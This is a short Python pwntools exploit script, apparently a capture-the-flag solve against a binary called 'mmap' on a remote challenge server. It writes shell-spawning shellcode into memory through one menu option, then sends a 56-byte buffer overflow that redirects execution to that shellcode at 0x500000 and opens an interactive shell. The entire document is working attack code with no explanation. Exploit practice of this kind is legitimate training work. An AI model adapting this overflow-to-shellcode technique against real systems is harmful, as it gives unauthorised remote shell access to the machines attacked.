from pwn import *

p = process('./mmap')
elf = context.binary = ELF("./mmap")
p = remote('pwn.sh4dy.com',5005)
# gdb.attach(p,'init-gef')

offset = 56
location = 0x500000
p.recvuntil(b"choice\n")
p.sendline(b'1')
p.recvline()
p.recvline()
sh = asm(shellcraft.sh())
p.sendline(sh)
p.recvuntil(b"choice\n")
p.sendline(b'2')
payload=flat(b'a'*offset,0x500000)
p.sendline(payload)
p.interactive()